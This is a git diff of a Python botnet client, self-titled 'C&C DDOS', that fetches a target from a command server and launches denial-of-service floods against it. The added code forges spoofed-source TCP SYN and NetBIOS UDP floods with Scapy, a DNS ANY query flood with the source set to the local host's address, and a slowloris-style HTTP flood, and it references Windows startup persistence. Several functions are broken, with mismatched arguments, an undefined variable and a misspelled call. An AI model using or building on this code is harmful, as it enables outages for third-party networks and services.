@@ -1,8 +1,8 @@
 """
 ==================================================
-| Author: KyaEH, Getwod, Luks, Neowi, 3RW4NFR    | 
-| V0.0.1                                         | 
-| Repo: https://github.com/kyaEH/C-CDDOS/        |
+| C&C DDOS By KyaEH, Getwod, Luks, Neowi, 3RW4NFR| 
+| V0.0.2										 | 
+| Repo: https://github.com/kyaEH/C-CDDOS/		 |
 ==================================================
 """
 
@@ -25,18 +25,19 @@ def winStartup():
 """
 	#bat_path = r"C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" % USER_NAME
 
-
 def checkTime():
 	now = datetime.now()
 	current_time = now.strftime("%M")
 
-	if current_time.endswith("0"):
+	if current_time.endswith("0") or current_time.endswith("5"):
 		return True
 	else:
 		timeremaining=current_time
-		timeremaining=timeremaining[1]
-		print("Temps restant: {} min".format(10-int("".join(timeremaining))))
-		return True 			#return false, true pour tester
+		timeremaining=int("".join(timeremaining[1]))
+		if timeremaining>5:
+			timeremaining-=5
+		print("Temps restant: {} min".format(5-timeremaining))
+		return False 			#return false, true pour tester
 	
 
 def waiting():
@@ -46,8 +47,7 @@ def waiting():
 			time.sleep(10)
 	
 		else: 
-			print("Waiting for the time...")
-			print("")
+			print("En attente du temps en cours...")
 			time.sleep(1)
 
 
@@ -57,46 +57,59 @@ def askOrder():
 	ipport= str(page.read()).replace("b",'').replace("'",'')  
 	cible = ipport.split(':')
 	if len(cible) != 2:
-		print('Erreur, cible incorrect: "{}"\nNouvel essai dans 1 minute'.format(ipport))
+		print('Erreur, cible incorrect: "{}"\nNouvel essai dans 10 secondes'.format(ipport))
 
 	else:
 		cible[1] = int(cible[1])
-		if cible[1]==53: 													
-			dnsFlood()
 
-		if cible[1]==80 or cible[1]==8080:
-			print("Cible: {}".format(ipport))
+		if cible[1]==21	:
+			tcpFlood(cible[0])
+
+		if cible[1]==53: 													
+			dnsFlood(cible[0])
+
+		if cible[1]==80 or cible[1]==8080 or cible[1]==443:
 			httpFlood(cible[0],cible[1])
 
 		if cible[1]==123:
 			ntpFlood(cible[0])
 
-		if cible[1]==23:
-			tcpFlood(cible[0])
+		if cible[1]==137:
+			netbiosFlood()
+
+		if cible[1]==404:
+			partieBastien()
+
 		else:
 			print('Erreur, cible incorrect: "{}"\nNouvel essai dans 1 minute'.format(ipport))
 
 
-def dnsFlood(cible):
-	print("DNS Flood sur {}".format(cible))
+def tcpFlood(cible):
+	ip = IP(src=RandIP("192.168.1.1/24"), dst=cible)
+	# forge a TCP SYN packet 
+	tcp = TCP(sport=RandShort(), dport=21, flags="S")
+	# flooding data
+	raw = Raw(b"\n\r\n\r\n\r\n\r"*4096)
+	# stack up the layers
+	p = ip / tcp / raw
+	send(p, loop=1, verbose=0)
 
-def ntpFlood():
-    global ntplist
-    global currentserver
-    global data
-    global target
+def dnsFlood(ip, port):
+	hostname = socket.gethostname()
+	target = socket.gethostbyname(hostname)
+	nameserver = ip
+	domain = ""
 
-ntpserver = ntplist[currentserver]
-currentserver = currentserver + 1
-pkt = IP(dsc=ntpserver, src=target)/UDP(sport=random.randint(1000, 65535),dport=123)/Raw(load=data)
-send(pkt,loop=1)
-	
-	print("NTP Flood sur {}".format(cible))
+	ip = IP(src=target, dst=nameserver)
+	udp = UDP(dport=port)
+	dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname=domain,qtype=255))
 
-def tcpFlood():
-	print("TCP FLood sur {}".format(cible))
+	request = (ip/udp/dns)
+
+	send(request,loop=1)
+
+
 def httpFlood(cible,port):
-	
 	list_of_sockets = []
 
 	regular_headers = [
@@ -134,6 +147,20 @@ def httpFlood(cible,port):
 
 		time.sleep(15)
 
+def ntpFlood(cible):
+	print("NTP Flood sur {}".format(cible))
+
+def netbiosFlood(cible):
+	ip = IP(src=RandIP("192.168.1.1/24"), dst=addr)
+	# forge a UDP packet 
+	udp = UDP(sport=RandShort(), dport=137)
+	# flooding data
+	raw = Raw(b"\n\r\n\r\n\r\n\r"*4096)
+	p = ip / udp / raw
+	send(p, loop=1, verbose=0)
+
+def partiebastien():
+	print("Aucunes infos donc jsp")
 
 if __name__=="__main__": 
 	#checkOS()
